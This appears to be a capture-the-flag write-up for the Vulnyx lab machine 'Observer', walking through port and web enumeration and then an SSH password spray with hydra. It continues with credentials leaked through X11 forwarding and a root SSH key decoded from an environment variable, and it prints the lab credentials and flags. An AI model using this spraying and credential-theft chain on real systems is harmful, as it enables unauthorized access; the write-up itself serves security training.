# Vulnyx: Observer

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `hydra` |
| **Tags** | `#InfoDisclosure` `#PasswordSpraying` `#X11Forwarding` `#CredentialLeak` `#EnvironmentVariable` |
| **URL** | https://vulnyx.com/machines/ |

A team page leaks a set of employee names, which turn out to double as valid usernames — and one of them reuses their own name as their password. Logging in with X11 forwarding enabled surfaces credentials for a second user, `remo`. From there, root's private key is sitting base64-encoded in an environment variable, readable with nothing more than `env`.

## Enumeration
### Port Enumeration
A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn observer.nyx

PORT   STATE  SERVICE  REASON
22/tcp open   ssh      syn-ack ttl 64
80/tcp open   http     syn-ack ttl 64
MAC Address: 08:00:27:7D:1E:06 (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV observer.nyx

PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open   http     Apache httpd 2.4.62 ((Debian))
|_http-title: iData-Hosting-Free-Bootstrap-Responsive-Webiste-Template
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:7D:1E:06 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

The main page:

```
http://observer.nyx/
```

<img src="../Images/observer/Pasted image 20260803132408.png"/>

```bash
$ ffuf -u http://observer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 2ms]
index.html              [Status: 200, Size: 35742, Words: 13650, Lines: 725, Duration: 4ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 6ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 12ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 14ms]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 13ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 14ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 11ms]
:: Progress: [882188/882188] :: Job [1/1] :: 4347 req/sec :: Duration: [0:04:06] :: Errors: 0 ::
```

Fuzzing turns up only static assets — no hidden app. The useful content is on the homepage itself: a "team" section lists employee names, which on a Linux box are worth treating as candidate usernames.

```
http://observer.nyx/#our-team
```

<img src="../Images/observer/Pasted image 20260803132506.png"/>

> **Users list:** `john`, `mike`, `remo`, `niscal`

## Initial Access

### Password Spraying via SSH

Spraying the same name list against itself over SSH tests the simplest possible case first — whether any user's password is just their own username:

```bash
$ hydra -L users.txt -P users.txt ssh://observer.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://observer.nyx:22/
[22][ssh] host: observer.nyx   login: niscal   password: niscal
1 of 1 target successfully completed, 1 valid password found
```

> **Credentials:** `niscal:niscal`

The login works, but the session prints a banner and closes immediately instead of dropping to a prompt:

```bash
$ ssh niscal@observer.nyx
niscal@observer.nyx's password:

#################################################
# Dear person,                                  #
# Not now! I'm busy with the terminal.          #
#                                                #
#                                                #
# by Niscal                                     #
#################################################

Connection to observer.nyx closed.
```

### X11 Forwarding → Leaked Credentials

That instant disconnect is the tell: `niscal`'s login runs a graphical program at startup and then exits, and over a plain SSH session there's no display for it to draw on, so nothing shows. Reconnecting with X11 forwarding (`-X`) gives that program a display on the attacker's machine — and it renders a window that leaks a second user's credentials:

```bash
$ ssh niscal@observer.nyx -X
```

<img src="../Images/observer/Pasted image 20260803132610.png"/>

> **Credentials:** `remo:REMOisGOD`

### Shell as remo

`hydra` confirms the recovered pair before using it:

```bash
$ hydra -l remo -p REMOisGOD ssh://observer.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://observer.nyx:22/
[22][ssh] host: observer.nyx   login: remo   password: REMOisGOD
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh remo@observer.nyx
remo@observer.nyx's password:
remo@observer:~$ id
uid=1001(remo) gid=1001(remo) groups=1001(remo)
remo@observer:~$ ls -l /home/remo
total 4
-r-------- 1 remo remo 33 Jun 11  2025 user.txt
remo@observer:~$ cat /home/remo/user.txt
f2edafebb9851d806ff15deb0477ebe8
```

> **User flag:** `f2edafebb9851d806ff15deb0477ebe8`

## Privilege Escalation

### A Root Key in an Environment Variable

A quick look at the environment is cheap and often overlooked, so `env` is worth a run before anything heavier:

```bash
remo@observer:~$ env
```

<img src="../Images/observer/Pasted image 20260803132814.png"/>

One variable, `rootKEY`, holds root's private SSH key base64-encoded. A single `base64 -d` turns it back into a usable key, which then authenticates as root over the loopback:

```bash
remo@observer:~$ echo $rootKEY | base64 -d > root_rsa
remo@observer:~$ chmod 600 root_rsa
remo@observer:~$ ssh -i root_rsa root@localhost
The authenticity of host 'localhost (::1)' can't be established.
ED25519 key fingerprint is SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
root@observer:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@observer:~# ls -l /root/
total 4
-r-------- 1 root root 33 Jun 11  2025 root.txt
root@observer:~# cat /root/root.txt
fa40a17de09827a5ae20a894304c6a49
```

> **Root flag:** `fa40a17de09827a5ae20a894304c6a49`

## Takeaways

- Public-facing "team" or "about us" pages are a common, low-effort source of real usernames — worth checking before falling back to generic name lists.
- Password reuse doesn't stop at real words; a username doubling as its own password is exactly the kind of pattern worth testing for directly in a credential spray.
- X11 forwarding extends a server-side GUI program's window onto the client — anything that machine pops up at login (even a "harmless" info panel) becomes readable to whoever connects with `-X`.
- Environment variables are process-visible, not user-visible the way file permissions are — stashing a secret there instead of in a properly permissioned file doesn't actually restrict who (or what shell session) can read it.